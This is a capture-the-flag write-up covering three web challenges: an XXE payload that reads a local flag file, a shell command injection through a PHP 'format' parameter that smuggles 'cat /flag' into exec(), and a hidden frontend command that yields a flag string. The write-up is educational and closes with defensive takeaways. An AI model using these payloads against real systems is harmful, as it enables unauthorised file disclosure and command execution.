
# ğŸ›¡ï¸ CTF Challenge Write-Up: Three Real-World Exploits

**Author:** Raj Konkar  
**Date:** May 12, 2025

In this write-up, I detail three vulnerabilities exploited during my CTF practice sessions. These reflect real-world flaws and highlight how methodical analysis can lead to successful flag capture.

---

## ğŸ§¨ Exploit 1: XXE (XML External Entity Injection)

**Challenge Type:** Web â€“ Firmware Update Simulation  
**Vulnerability:** Improper XML parsing in a POST endpoint  
**Affected Endpoint:** `/api/update`

### ğŸ” Identification
The web app used a POST endpoint to submit XML data. By inspecting `update.js`, I noticed the content type `application/xml`, hinting that a vulnerable XML parser was in use. Testing with curl confirmed the endpoint behavior.

### ğŸ”§ Exploit Payload
```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ELEMENT FirmwareUpdateConfig ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```

### âœ… Result
The server response included the contents of `/flag.txt`, confirming a successful XXE-based file disclosure.

---

## ğŸ§¨ Exploit 2: Command Injection via PHP `exec()`

**Challenge Type:** Web â€“ Time Display App (TimeKORP)  
**Vulnerability:** Command Injection  
**Affected Parameter:** `format`

### ğŸ” Identification
Reviewing `TimeModel.php`, I found the `format` parameter passed directly into a shell command via `exec()`:
```php
$this->command = "date '+" . $format . "'";
```

### ğŸ”§ Exploit Payload
```bash
'; cat /flag; #
```
Encoded:
```
%27%3Bcat%20/flag%3B%23
```
Final URL:
```
http://[target]/?format=%27%3Bcat%20/flag%3B%23
```

### âœ… Result
The server returned the contents of `/flag`, confirming successful command injection.

---

## ğŸ§¨ Exploit 3: Hidden Logic Command Trigger

**Challenge Type:** Web â€“ Text-Based Adventure Game  
**Vulnerability:** Frontend-hidden logic validation bypass

### ğŸ” Identification
The frontend validated commands using a JavaScript `availableOptions` object. Monitoring `/api/options` in DevTools revealed a hidden `"secret"` command:

```
"secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]
```

### ğŸ”§ Exploit
I entered the string exactly as shown in the interface:
```
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

### âœ… Result
The app triggered `/api/monitor` and returned:
```
HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_ab637978c1631b43cc6040d8a1e544ba}
```

---

## ğŸ§  Key Takeaways

- Always inspect JavaScript and frontend logic.
- XML endpoints must be hardened against XXE.
- Direct use of `exec()` on user input is highly dangerous.
- CTFs mirror real-world flaws, and practice translates into real pentesting skill.

---

> ğŸ“Œ *For more CTFs and security tools, visit my GitHub: [https://github.com/rajkonkar](https://github.com/rajkonkar)*

